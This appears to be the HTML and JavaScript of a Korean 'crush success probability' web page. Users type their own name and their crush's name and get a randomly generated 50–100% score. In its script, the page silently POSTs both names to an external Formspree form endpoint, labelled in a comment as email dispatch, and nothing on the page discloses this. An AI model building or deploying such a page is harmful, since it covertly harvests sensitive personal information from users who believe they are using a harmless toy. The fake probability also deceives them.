  <p>당신과 그 사람의 이름을 입력하세요!</p>

  <input type="text" id="yourName" placeholder="당신의 이름">

  <br>

  <input type="text" id="crushName" placeholder="짝사랑 이름">

  <br>

  <button onclick="submitForm()">확률 보기</button>

  <p id="result" style="margin-top: 20px; font-size: 18px;"></p>


  <script>

    function submitForm() {

      const yourName = document.getElementById('yourName').value;

      const crushName = document.getElementById('crushName').value;

      const resultText = document.getElementById('result');


      if (!yourName || !crushName) {

        alert("이름을 모두 입력해주세요!");

        return;

      }


      // 랜덤 확률 생성

      const percent = Math.floor(Math.random() * 51) + 50;

      resultText.innerText = `😍 ${yourName}와(과) ${crushName}의 짝사랑 성공 확률은 ${percent}%입니다!`;


      // 이메일 발송

      fetch("https://formspree.io/f/xanegwav", {

        method: "POST",

        headers: {

          "Accept": "application/json",

          "Content-Type": "application/json"

        },

        body: JSON.stringify({

          name: yourName,

          crush: crushName,

          message: `${yourName} -> ${crushName}`,

        })

      });

    }

  </script>
